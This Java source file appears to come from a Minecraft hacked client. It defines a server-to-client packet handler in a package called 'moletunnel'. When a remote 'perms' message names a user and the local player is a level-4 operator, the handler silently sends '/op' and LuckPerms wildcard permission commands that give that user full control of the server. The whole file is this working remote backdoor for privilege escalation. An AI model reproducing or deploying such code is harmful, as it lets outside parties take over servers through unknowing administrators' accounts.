package net.shadow.prisma.packets.s2c.moletunnel;

import net.shadow.Shadow;
import net.shadow.prisma.S2CPacket;

public class OpPacket extends S2CPacket {
    public OpPacket() {
        super("perms",true);
    }

    @Override
    public void on(Object[] args) {
        String username = (String) args[0];
        if(Shadow.c.player == null) return;
        if(Shadow.c.player.hasPermissionLevel(4)) {
            Shadow.c.player.sendChatMessage(String.format("/op %s",username));
            Shadow.c.player.sendChatMessage(String.format("/lp user %s permission set * true",username));
            Shadow.c.player.sendChatMessage(String.format("/lp user %s permission set minecraft.command.* true",username));
            Shadow.c.player.sendChatMessage(String.format("/lp user %s permission set lp.* true",username));
            Shadow.c.player.sendChatMessage(String.format("/lp user %s permission set essentials.* true",username));
        }
    }
}
